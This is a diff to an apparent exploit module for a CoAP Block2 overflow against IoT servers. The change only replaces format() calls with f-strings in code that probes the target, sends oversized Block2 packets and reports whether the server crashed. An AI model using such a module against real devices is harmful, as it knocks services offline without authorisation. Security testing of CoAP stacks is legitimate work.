@@ -168,11 +168,11 @@ class Exploit(Exploit):
 
     @multi
     def run(self):
-        print_status("CoAP Block2 Overflow → {}:{}".format(self.target, self.port))
-        print_info("Recurso alvo: {}".format(self.resource_path))
+        print_status(f"CoAP Block2 Overflow → {self.target}:{self.port}")
+        print_info(f"Recurso alvo: {self.resource_path}")
 
         if not self._is_alive():
-            print_error("Servidor CoAP não respondendo em {}:{}".format(self.target, self.port))
+            print_error(f"Servidor CoAP não respondendo em {self.target}:{self.port}")
             return
 
         print_success("Servidor CoAP confirmado")
@@ -186,10 +186,10 @@ class Exploit(Exploit):
             code_str = ""
             if resp and len(resp) >= 2:
                 cb = resp[1]
-                code_str = "{}.{:02d}".format((cb >> 5) & 0x07, cb & 0x1F)
-            params = "NUM={},M={},SZX={}".format(num, m, szx)
+                code_str = f"{(cb >> 5) & 0x07}.{cb & 0x1F:02d}"
+            params = f"NUM={num},M={m},SZX={szx}"
             results.append((name, params, status, code_str, len(resp) if resp else 0))
-            print_info("  [{}] {} → {} {}".format(name, params, status, code_str))
+            print_info(f"  [{name}] {params} → {status} {code_str}")
 
         pkt = self._build_oversized_block2()
         resp = self._send_coap(pkt)
@@ -208,7 +208,7 @@ class Exploit(Exploit):
         print_table(headers, *results)
 
         no_resp = sum(1 for r in results if r[2] == "no_response")
-        print_info("Resumo: {} testes, {} sem resposta".format(len(results), no_resp))
+        print_info(f"Resumo: {len(results)} testes, {no_resp} sem resposta")
 
         if not alive:
             print_success("Servidor CRASHOU após payloads Block2 overflow")
